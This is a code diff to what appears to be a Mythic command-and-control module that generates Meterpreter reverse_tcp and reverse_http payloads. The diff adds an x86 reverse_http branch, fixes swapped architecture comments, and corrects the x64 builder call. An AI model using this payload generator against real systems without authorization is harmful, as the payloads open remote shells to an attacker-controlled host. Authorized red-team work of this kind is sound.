@@ -55,7 +55,7 @@ class MeterpreterCommand(CommandBase):
 
 
         ###
-        # x64 Payload Generation
+        # x86 Payload Generation
         ###
         if task.args.get_arg("arch").lower() == "x86":
 
@@ -66,8 +66,15 @@ class MeterpreterCommand(CommandBase):
                     build_meterpreter_reverse_tcp_86(task.args.get_arg("lhost"),
                                                      task.args.get_arg("lport")))
 
+            # reverse_http
+
+            if task.args.get_arg("payload_type").lower() == "reverse_http":
+                resp = await MythicFileRPC(task).register_file(
+                    build_meterpreter_reverse_http_86(task.args.get_arg("lhost"),
+                                                      task.args.get_arg("lport")))
+
         ###
-        # x86 Payload Generation
+        # x64 Payload Generation
         ###
         if task.args.get_arg("arch").lower() == "x64":
 
@@ -82,8 +89,9 @@ class MeterpreterCommand(CommandBase):
 
             if task.args.get_arg("payload_type").lower() == "reverse_http":
                 resp = await MythicFileRPC(task).register_file(
-                    build_meterpreter_reverse_http_86(task.args.get_arg("lhost"),
+                    build_meterpreter_reverse_http_64(task.args.get_arg("lhost"),
                                                       task.args.get_arg("lport")))
+
 
         # Remove args that are unused by remote agent
         task.args.remove_arg("lhost")
